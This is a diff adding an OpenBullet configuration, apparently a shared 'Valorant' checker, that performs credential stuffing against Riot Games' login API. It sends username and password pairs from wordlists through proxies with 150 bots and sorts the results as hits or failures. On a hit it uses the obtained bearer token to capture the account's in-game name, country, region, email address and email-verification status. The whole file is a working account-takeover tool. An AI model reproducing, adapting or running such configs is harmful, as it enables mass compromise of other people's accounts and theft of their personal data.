@@ -1,0 +1,123 @@
+﻿[SETTINGS]
+{
+  "Name": "Valorant[OBC]",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-11T10:20:59.1564981+01:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://auth.riotgames.com/api/v1/authorization" 
+  CONTENT "{\"acr_values\":\"urn:riot:bronze\",\"claims\":\"\",\"client_id\":\"riot-client\",\"nonce\":\"oYnVwCSrlS5IHKh7iI17oQ\",\"redirect_uri\":\"http://localhost/redirect\",\"response_type\":\"token id_token\",\"scope\":\"openid link ban lol_region\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: auth.riotgames.com" 
+  HEADER "Proxy-Connection: keep-alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "origin: https://auth.riotgames.com" 
+  HEADER "referer: https://auth.riotgames.com/login" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36" 
+  HEADER "accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 216" 
+
+PARSE "<COOKIES(asid)>" JSON "" -> VAR "asid" 
+
+PARSE "<COOKIES(__cfduid)>" JSON "" -> VAR "cf" 
+
+PARSE "<COOKIES(did)>" JSON "" -> VAR "did" 
+
+PARSE "<COOKIES(__cf_bm)>" JSON "" -> VAR "bm" 
+
+REQUEST PUT "https://auth.riotgames.com/api/v1/authorization" 
+  CONTENT "{\"type\":\"auth\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":false,\"language\":\"en_US\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fr-FR,fr;q=0.9" 
+  HEADER "content-length: 99" 
+  HEADER "content-type: application/json" 
+  HEADER "Cookie: did=<did>; asid=<asid>; clid=ec1; __cfduid=<cf>; __cf_bm=<bm>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 105" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"type\":\"response" 
+  KEYCHAIN Failure OR 
+    KEY "type\":\"auth" 
+  KEYCHAIN Retry OR 
+    KEY "invalid_session_id" 
+
+PARSE "<SOURCE>" LR "token=" "&scop" -> VAR "str" 
+
+REQUEST POST "https://auth.riotgames.com/userinfo" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <str>" 
+  HEADER "X-Riot-Entitlements-JWT: <text3>" 
+
+#game_name PARSE "<SOURCE>" LR "game_name\":\"" "\"" CreateEmpty=FALSE -> CAP "game_name" 
+
+#Country PARSE "<SOURCE>" LR "country\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#Region PARSE "<SOURCE>" LR "tag_line\":\"" "\"" CreateEmpty=FALSE -> CAP "Region" 
+
+REQUEST GET "https://email-verification.riotgames.com/api/v1/account/status" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <str>" 
+  HEADER "X-Riot-Entitlements-JWT: <text3>" 
+
+#mail PARSE "<SOURCE>" LR "email\":\"" "\"" CreateEmpty=FALSE -> CAP "mail" 
+
+#isVerified PARSE "<SOURCE>" LR "emailVerified\":" "}" CreateEmpty=FALSE -> CAP "isVerified" 
+  
